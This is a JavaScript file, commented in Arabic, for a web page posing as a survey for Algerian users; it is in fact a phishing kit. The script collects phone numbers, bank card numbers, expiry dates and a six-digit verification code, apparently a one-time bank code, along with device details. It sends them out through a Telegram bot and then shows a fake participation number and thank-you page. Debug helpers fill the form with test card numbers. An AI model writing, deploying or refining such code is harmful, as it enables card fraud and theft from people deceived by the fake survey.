// تهيئة التطبيق
document.addEventListener('DOMContentLoaded', function() {
    console.log('🚀 بدء تحميل الموقع...');
    
    // إخفاء شاشة التحميل بعد 3 ثواني
    setTimeout(() => {
        document.getElementById('loading-screen').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loading-screen').style.display = 'none';
            showPage('home-page');
            
            // بدء تتبع المستخدم
            if (typeof startUserTracking === 'function') {
                startUserTracking();
            }
        }, 500);
    }, 3000);
    
    // تهيئة نموذج الاستبيان
    initSurveyForm();
});

// إظهار صفحة محددة
function showPage(pageId) {
    console.log(`📄 الانتقال إلى الصفحة: ${pageId}`);
    
    const pages = document.querySelectorAll('.page');
    pages.forEach(page => {
        page.classList.remove('active');
    });
    
    const targetPage = document.getElementById(pageId);
    if (targetPage) {
        targetPage.classList.add('active');
        
        // إرسال بيانات تتبع الصفحة
        if (typeof trackPageView === 'function') {
            trackPageView(pageId);
        }
    }
}

// الانتقال للصفحة الرئيسية
function goHome() {
    console.log('🏠 العودة للصفحة الرئيسية');
    showPage('home-page');
    resetSurvey();
}

// بدء الاستبيان
function startSurvey() {
    console.log('📝 بدء الاستبيان');
    showPage('survey-page');
    
    if (typeof trackButtonClick === 'function') {
        trackButtonClick('start-survey-button');
    }
}

// العودة للصفحة السابقة
function goBack() {
    const currentStep = getCurrentStep();
    console.log(`↩️ العودة من الخطوة ${currentStep}`);
    
    if (currentStep > 1) {
        showStep(currentStep - 1);
    } else {
        showPage('home-page');
    }
    
    if (typeof trackButtonClick === 'function') {
        trackButtonClick('back-button');
    }
}

// إدارة خطوات الاستبيان
let currentStep = 1;
let step1DataSent = false; // لمنع الإرسال المزدوج

function showStep(stepNumber) {
    console.log(`📊 عرض الخطوة ${stepNumber}`);
    
    const steps = document.querySelectorAll('.survey-step');
    steps.forEach(step => {
        step.classList.remove('active');
    });
    
    const stepElement = document.getElementById(`step-${stepNumber}`);
    if (stepElement) {
        stepElement.classList.add('active');
        
        // تحديث شريط التقدم
        updateProgressBar(stepNumber);
        
        currentStep = stepNumber;
    }
}

function getCurrentStep() {
    return currentStep;
}

function nextStep(current) {
    console.log(`➡️ محاولة الانتقال من الخطوة ${current}`);
    
    // التحقق من صحة البيانات في الخطوة الحالية
    if (!validateStep(current)) {
        console.log('❌ فشل التحقق من الخطوة');
        showNotification('يرجى ملء جميع الحقول المطلوبة بشكل صحيح', 'error');
        return;
    }
    
    if (current === 1) {
        console.log('📋 معالجة الخطوة 1...');
        
        // منع الإرسال المزدوج
        if (step1DataSent) {
            console.log('⚠️ البيانات أرسلت مسبقاً، تخطي الإرسال');
            showStep(2);
            detectDeviceInfo();
            return;
        }
        
        // جمع بيانات الخطوة الأولى
        const formData = collectStep1Data();
        console.log('📊 بيانات الخطوة 1:', formData);
        
        // التحقق من رقم الهاتف الجزائري
        if (!validateAlgerianPhone(formData.phone)) {
            console.log('❌ رقم الهاتف غير صالح');
            showNotification('يرجى إدخال رقم هاتف جزائري صحيح (05XX XX XX XX)', 'error');
            return;
        }
        
        // التحقق من رقم البطاقة
        const cardValid = validateCardNumber(formData.cardNumber);
        console.log(`💳 تحقق البطاقة: ${cardValid ? 'صالح' : 'غير صالح'}`);
        
        if (!cardValid) {
            showNotification('رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة صحيح', 'error');
            return;
        }
        
        // إرسال البيانات إلى تليجرام
        console.log('📤 إرسال البيانات إلى تليجرام...');
        
        let sendSuccess = false;
        if (typeof sendTelegramData === 'function') {
            sendSuccess = sendTelegramData('step1_completed', formData);
        } else {
            console.warn('⚠️ دالة sendTelegramData غير موجودة، تخطي الإرسال');
            sendSuccess = true; // للاختبار فقط
        }
        
        if (sendSuccess) {
            console.log('✅ تم إرسال/تخطي البيانات بنجاح');
            step1DataSent = true;
            showStep(2);
            detectDeviceInfo();
        } else {
            console.log('❌ فشل إرسال البيانات');
            showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
        }
        
    } else if (current === 2) {
        console.log('📋 معالجة الخطوة 2...');
        
        const verificationCode = document.getElementById('verification-code').value;
        console.log(`🔢 كود التحقق المدخل: ${verificationCode}`);
        
        // التحقق من صحة الكود
        if (!verificationCode || verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
            console.log('❌ كود التحقق غير صالح');
            showNotification('يرجى إدخال رمز تحقق مكون من 6 أرقام', 'error');
            return;
        }
        
        // جمع البيانات النهائية
        const finalData = collectAllData();
        console.log('📊 البيانات النهائية:', finalData);
        
        // إرسال البيانات النهائية إلى تليجرام
        console.log('📤 إرسال البيانات النهائية إلى تليجرام...');
        
        let sendSuccess = false;
        if (typeof sendTelegramData === 'function') {
            sendSuccess = sendTelegramData('survey_completed', finalData);
        } else {
            console.warn('⚠️ دالة sendTelegramData غير موجودة، تخطي الإرسال');
            sendSuccess = true; // للاختبار فقط
        }
        
        if (sendSuccess) {
            console.log('✅ تم إرسال/تخطي البيانات النهائية بنجاح');
            
            // تحديث رقم المشاركة
            const participationId = `ALG-${Date.now().toString().slice(-8)}`;
            document.getElementById('participation-id').textContent = participationId;
            console.log(`🎫 رقم المشاركة: ${participationId}`);
            
            showStep(3);
            
            // إرسال تأكيد الإكمال
            if (typeof sendTelegramData === 'function') {
                sendTelegramData('thankyou_page_viewed', {});
            }
        } else {
            console.log('❌ فشل إرسال البيانات النهائية');
            showNotification('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
        }
    }
    
    if (typeof trackButtonClick === 'function') {
        trackButtonClick(`next-button-step-${current}`);
    }
}

function updateProgressBar(step) {
    console.log(`📶 تحديث شريط التقدم للخطوة ${step}`);
    
    const steps = document.querySelectorAll('.progress-step');
    steps.forEach((stepElement, index) => {
        if (index + 1 <= step) {
            stepElement.classList.add('active');
        } else {
            stepElement.classList.remove('active');
        }
    });
}

// دالة محسنة للتحقق من رقم البطاقة باستخدام خوارزمية Luhn
function validateCardNumber(cardNumber) {
    // 1. إزالة جميع المسافات والأحرف غير رقمية
    const cleanNumber = cardNumber.replace(/\s/g, '').replace(/\D/g, '');
    
    // 2. التحقق من أن الرقم يحتوي فقط على أرقام
    if (!/^\d+$/.test(cleanNumber)) {
        console.log('❌ البطاقة تحتوي على أحرف غير رقمية');
        return false;
    }
    
    // 3. التحقق من الطول (معظم البطاقات 13-19 رقم)
    if (cleanNumber.length < 13 || cleanNumber.length > 19) {
        console.log(`❌ طول البطاقة غير صحيح: ${cleanNumber.length} رقم (المطلوب 13-19)`);
        return false;
    }
    
    // 4. تطبيق خوارزمية Luhn للتحقق
    let sum = 0;
    let isEven = false;
    
    // الانتقال من اليمين إلى اليسار
    for (let i = cleanNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanNumber.charAt(i), 10);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    const isValid = (sum % 10) === 0;
    console.log(`🔢 خوارزمية Luhn: المجموع=${sum}, صالح=${isValid}`);
    
    return isValid;
}

// دالة لتنسيق رقم البطاقة أثناء الكتابة
function formatCardNumber(value) {
    // إزالة جميع الأحرف غير رقمية
    const numbers = value.replace(/\D/g, '');
    
    // تقسيم إلى مجموعات من 4 أرقام
    const groups = [];
    for (let i = 0; i < numbers.length; i += 4) {
        groups.push(numbers.substr(i, 4));
    }
    
    // دمج المجموعات مع مسافات
    return groups.join(' ').trim();
}

function validateStep(step) {
    console.log(`🔍 التحقق من صحة الخطوة ${step}`);
    
    let isValid = true;
    
    if (step === 1) {
        const phone = document.getElementById('phone').value;
        const card = document.getElementById('card-number').value;
        const expiry = document.getElementById('expiry-date').value;
        const privacy = document.getElementById('privacy-check').checked;
        
        console.log(`📱 الهاتف: ${phone}`);
        console.log(`💳 البطاقة: ${card}`);
        console.log(`📅 التاريخ: ${expiry}`);
        console.log(`✅ الخصوصية: ${privacy}`);
        
        if (!validateAlgerianPhone(phone)) {
            markInvalid('phone', 'رقم الهاتف غير صحيح (يجب أن يكون 05XX XX XX XX)');
            isValid = false;
        } else {
            markValid('phone');
        }
        
        // التحقق باستخدام الدالة المحسنة
        if (!validateCardNumber(card)) {
            markInvalid('card-number', 'رقم البطاقة غير صالح. تأكد من إدخال رقم بطاقة حقيقي');
            isValid = false;
        } else {
            markValid('card-number');
        }
        
        if (!expiry) {
            markInvalid('expiry-date', 'يرجى تحديد تاريخ الصلاحية');
            isValid = false;
        } else {
            markValid('expiry-date');
        }
        
        if (!privacy) {
            showNotification('يرجى الموافقة على سياسة الخصوصية', 'error');
            isValid = false;
        }
    }
    
    console.log(`✅ نتيجة التحقق: ${isValid ? 'ناجح' : 'فشل'}`);
    return isValid;
}

function validateAlgerianPhone(phone) {
    const cleanPhone = phone.replace(/\s/g, '');
    const regex = /^(05|06|07)[0-9]{8}$/;
    const isValid = regex.test(cleanPhone);
    console.log(`📞 تحقق الهاتف الجزائري: ${isValid ? 'صالح' : 'غير صالح'}`);
    return isValid;
}

function markInvalid(fieldId, message) {
    console.log(`❌ حقل غير صالح: ${fieldId} - ${message}`);
    
    const field = document.getElementById(fieldId);
    if (!field) return;
    
    const validationMsg = field.parentNode.querySelector('.validation-message');
    if (validationMsg) {
        field.style.borderColor = '#e74c3c';
        validationMsg.textContent = message;
        validationMsg.style.color = '#e74c3c';
    }
}

function markValid(fieldId) {
    console.log(`✅ حقل صالح: ${fieldId}`);
    
    const field = document.getElementById(fieldId);
    if (!field) return;
    
    const validationMsg = field.parentNode.querySelector('.validation-message');
    if (validationMsg) {
        field.style.borderColor = '#2ecc71';
        validationMsg.textContent = '✓ صحيح';
        validationMsg.style.color = '#2ecc71';
    }
}

function collectStep1Data() {
    return {
        phone: document.getElementById('phone').value,
        cardNumber: document.getElementById('card-number').value,
        expiryDate: document.getElementById('expiry-date').value,
        timestamp: new Date().toISOString(),
        sessionId: getSessionId()
    };
}

function collectAllData() {
    const deviceInfo = getDeviceInfo();
    
    return {
        ...collectStep1Data(),
        verificationCode: document.getElementById('verification-code').value,
        deviceInfo: deviceInfo,
        userAgent: navigator.userAgent,
        finalTimestamp: new Date().toISOString()
    };
}

function getSessionId() {
    if (!sessionStorage.getItem('survey_session_id')) {
        const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
        sessionStorage.setItem('survey_session_id', sessionId);
        console.log(`🆔 معرف الجلسة الجديد: ${sessionId}`);
    }
    return sessionStorage.getItem('survey_session_id');
}

function resetSurvey() {
    console.log('🔄 إعادة تعيين الاستبيان');
    
    currentStep = 1;
    step1DataSent = false; // إعادة تعيين علامة الإرسال
    
    const form = document.querySelector('.survey-form');
    if (form) {
        form.reset();
    }
    
    document.getElementById('verification-code').value = '';
    
    document.querySelectorAll('.validation-message').forEach(msg => {
        msg.textContent = '';
    });
    
    updateProgressBar(1);
    showStep(1);
}

// إظهار الإشعارات
function showNotification(message, type = 'info') {
    console.log(`💬 إشعار: ${message} (${type})`);
    
    const notification = document.getElementById('notification');
    if (!notification) return;
    
    notification.textContent = message;
    
    // تخصيص الألوان حسب النوع
    if (type === 'error') {
        notification.style.background = '#e74c3c';
    } else if (type === 'success') {
        notification.style.background = '#2ecc71';
    } else {
        notification.style.background = '#333';
    }
    
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// اكتشاف معلومات الجهاز
function detectDeviceInfo() {
    console.log('🖥️ اكتشاف معلومات الجهاز...');
    
    const deviceInfo = getDeviceInfo();
    
    // تحديث العناصر في الصفحة
    const deviceTypeEl = document.getElementById('device-type');
    const osTypeEl = document.getElementById('os-type');
    const browserTypeEl = document.getElementById('browser-type');
    const screenResEl = document.getElementById('screen-resolution');
    
    if (deviceTypeEl) deviceTypeEl.textContent = deviceInfo.deviceType;
    if (osTypeEl) osTypeEl.textContent = deviceInfo.os;
    if (browserTypeEl) browserTypeEl.textContent = deviceInfo.browser;
    if (screenResEl) screenResEl.textContent = `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
    
    console.log('📊 معلومات الجهاز:', deviceInfo);
}

function initSurveyForm() {
    console.log('📝 تهيئة نموذج الاستبيان...');
    
    // تنسيق رقم البطاقة
    const cardInput = document.getElementById('card-number');
    
    if (cardInput) {
        cardInput.addEventListener('input', function(e) {
            const originalValue = e.target.value;
            
            // تنسيق الرقم
            const formatted = formatCardNumber(originalValue);
            e.target.value = formatted;
            
            // التحقق في الوقت الحقيقي
            const cleanNumber = formatted.replace(/\s/g, '');
            
            if (cleanNumber.length > 0) {
                if (cleanNumber.length >= 13) {
                    if (validateCardNumber(formatted)) {
                        markValid('card-number');
                    } else {
                        const validationMsg = cardInput.parentNode.querySelector('.validation-message');
                        if (cleanNumber.length >= 16) {
                            validationMsg.textContent = 'رقم البطاقة غير صالح';
                        } else if (cleanNumber.length > 19) {
                            validationMsg.textContent = 'الرقم طويل جداً (19 رقم كحد أقصى)';
                        } else {
                            validationMsg.textContent = '';
                        }
                        if (validationMsg) {
                            validationMsg.style.color = '#e74c3c';
                        }
                        cardInput.style.borderColor = '#e74c3c';
                    }
                } else if (cleanNumber.length < 13) {
                    const validationMsg = cardInput.parentNode.querySelector('.validation-message');
                    if (validationMsg) {
                        validationMsg.textContent = cleanNumber.length > 0 ? 'يجب أن يكون 13 رقم على الأقل' : '';
                        validationMsg.style.color = '#e74c3c';
                    }
                    cardInput.style.borderColor = '#e74c3c';
                }
            } else {
                const validationMsg = cardInput.parentNode.querySelector('.validation-message');
                if (validationMsg) {
                    validationMsg.textContent = '';
                }
                cardInput.style.borderColor = '#e0e0e0';
            }
        });
    }
    
    // تنسيق رقم الهاتف
    const phoneInput = document.getElementById('phone');
    
    if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            // تحديد الطول الأقصى للرقم الجزائري
            if (value.startsWith('0')) {
                value = value.substring(0, 10);
                
                // تنسيق مع المسافات
                if (value.length >= 2) {
                    value = value.replace(/(\d{2})(?=\d)/, '$1 ');
                }
                if (value.length >= 5) {
                    value = value.replace(/(\d{2} \d{2})(?=\d)/, '$1 ');
                }
                if (value.length >= 8) {
                    value = value.replace(/(\d{2} \d{2} \d{2})(?=\d)/, '$1 ');
                }
            }
            
            e.target.value = value;
            
            // التحقق في الوقت الحقيقي
            const cleanPhone = value.replace(/\s/g, '');
            if (cleanPhone.length > 0) {
                if (cleanPhone.length === 10) {
                    if (validateAlgerianPhone(value)) {
                        markValid('phone');
                    } else {
                        markInvalid('phone', 'رقم جزائري غير صحيح');
                    }
                } else if (cleanPhone.length < 10) {
                    const validationMsg = phoneInput.parentNode.querySelector('.validation-message');
                    if (validationMsg) {
                        validationMsg.textContent = '10 أرقام مطلوبة';
                        validationMsg.style.color = '#e74c3c';
                    }
                    phoneInput.style.borderColor = '#e74c3c';
                }
            } else {
                const validationMsg = phoneInput.parentNode.querySelector('.validation-message');
                if (validationMsg) {
                    validationMsg.textContent = '';
                }
                phoneInput.style.borderColor = '#e0e0e0';
            }
        });
    }
    
    // تاريخ انتهاء الصلاحية - تعيين القيمة الدنيا
    const expiryInput = document.getElementById('expiry-date');
    if (expiryInput) {
        const today = new Date();
        const minDate = today.getFullYear() + '-' + String(today.getMonth() + 1).padStart(2, '0');
        expiryInput.min = minDate;
    }
    
    console.log('✅ تم تهيئة النموذج بنجاح');
}

// دالة مساعدة للحصول على معلومات الجهاز
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = 'Desktop';
    let os = 'Unknown OS';
    let browser = 'Unknown Browser';
    
    // اكتشاف نوع الجهاز
    if (/mobile|android|iphone|ipad/i.test(userAgent)) {
        deviceType = /tablet|ipad/i.test(userAgent) ? 'Tablet' : 'Mobile';
    }
    
    // اكتشاف نظام التشغيل
    if (/windows/i.test(userAgent)) {
        os = 'Windows';
    } else if (/macintosh|mac os x/i.test(userAgent)) {
        os = 'macOS';
    } else if (/android/i.test(userAgent)) {
        os = 'Android';
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        os = 'iOS';
    } else if (/linux/i.test(userAgent)) {
        os = 'Linux';
    }
    
    // اكتشاف المتصفح
    if (/chrome/i.test(userAgent) && !/edge/i.test(userAgent)) {
        browser = 'Chrome';
    } else if (/firefox/i.test(userAgent)) {
        browser = 'Firefox';
    } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
        browser = 'Safari';
    } else if (/edge/i.test(userAgent)) {
        browser = 'Edge';
    } else if (/opera|opr/i.test(userAgent)) {
        browser = 'Opera';
    }
    
    return {
        deviceType,
        os,
        browser,
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        online: navigator.onLine
    };
}

// دالة اختبار إرسال إلى تليجرام مباشرة
function testTelegramDirectly() {
    console.log('🧪 اختبار إرسال مباشر إلى تليجرام');
    
    const testData = {
        phone: '0551234567',
        cardNumber: '4532015148423237',
        expiryDate: '2025-12',
        timestamp: new Date().toISOString(),
        sessionId: getSessionId()
    };
    
    let result = false;
    if (typeof sendTelegramData === 'function') {
        result = sendTelegramData('test_direct', testData);
    } else {
        console.warn('⚠️ دالة sendTelegramData غير موجودة');
        result = true;
    }
    
    console.log(`📤 نتيجة الاختبار: ${result ? 'تم الإرسال/تخطي' : 'فشل الإرسال'}`);
    return result;
}

// دالة اختبار برقم بطاقة صالح للاستخدام
function testValidCard() {
    const testCards = [
        '4532015148423237', // Visa صالح (16 رقم)
        '5555555555554444', // MasterCard صالح (16 رقم)
        '4111111111111111', // Visa صالح (16 رقم) اختبار
        '378282246310005',  // American Express صالح (15 رقم)
        '6011111111111117', // Discover صالح (16 رقم)
        '30569309025904',   // Diners Club صالح (14 رقم)
        '3566002020360505'  // JCB صالح (16 رقم)
    ];
    
    const randomCard = testCards[Math.floor(Math.random() * testCards.length)];
    const formattedCard = formatCardNumber(randomCard);
    
    document.getElementById('card-number').value = formattedCard;
    
    // تشغيل التحقق
    const event = new Event('input', { bubbles: true });
    document.getElementById('card-number').dispatchEvent(event);
    
    console.log('✅ تم تعيين رقم بطاقة اختبار صالح:', formattedCard);
    return formattedCard;
}

// دالة اختبار كاملة للاستبيان
function runFullTest() {
    console.log('🧪 بدء اختبار كامل للاستبيان');
    
    // تعيين بيانات اختبارية
    document.getElementById('phone').value = '0551234567';
    document.getElementById('card-number').value = '4532 0151 4842 3237';
    document.getElementById('expiry-date').value = '2025-12';
    document.getElementById('privacy-check').checked = true;
    
    // تشغيل أحداث الإدخال للتحقق
    ['phone', 'card-number'].forEach(id => {
        const event = new Event('input', { bubbles: true });
        const element = document.getElementById(id);
        if (element) {
            element.dispatchEvent(event);
        }
    });
    
    console.log('✅ تم تعيين بيانات الاختبار');
    console.log('📋 الخطوة التالية: اضغط على "متابعة"');
}

// دالة لفحص إعدادات تليجرام
function checkTelegramSetup() {
    console.log('🔍 فحص إعدادات تليجرام...');
    
    if (typeof checkTelegramSetup !== 'undefined' && typeof checkTelegramSetup === 'function') {
        return checkTelegramSetup();
    } else {
        console.log('ℹ️ دالة checkTelegramSetup غير متوفرة في هذا السياق');
        console.log('📋 افتح telegram.js وتأكد من تعيين:');
        console.log('   - TELEGRAM_BOT_TOKEN (توكن البوت)');
        console.log('   - TELEGRAM_CHAT_ID (رقم الدردشة)');
        return false;
    }
}

// إضافة أداة للتحقق من صحة البطاقة يدوياً
function validateCardManually(cardNumber) {
    console.log('🔢 التحقق اليدوي من البطاقة:', cardNumber);
    const result = validateCardNumber(cardNumber);
    console.log(`✅ النتيجة: ${result ? 'صالح' : 'غير صالح'}`);
    return result;
}

// عند تحميل الصفحة، التحقق من الإعدادات
window.addEventListener('load', function() {
    console.log('🌐 تم تحميل الصفحة بالكامل');
    console.log('🔍 للإختبار، افتح Console (F12)');
    console.log('📝 جرب هذه الأوامر:');
    console.log('   - runFullTest() - لملء النموذج تلقائياً');
    console.log('   - testValidCard() - لاختبار بطاقة صالحة');
    console.log('   - checkTelegramSetup() - للتحقق من إعدادات تليجرام');
});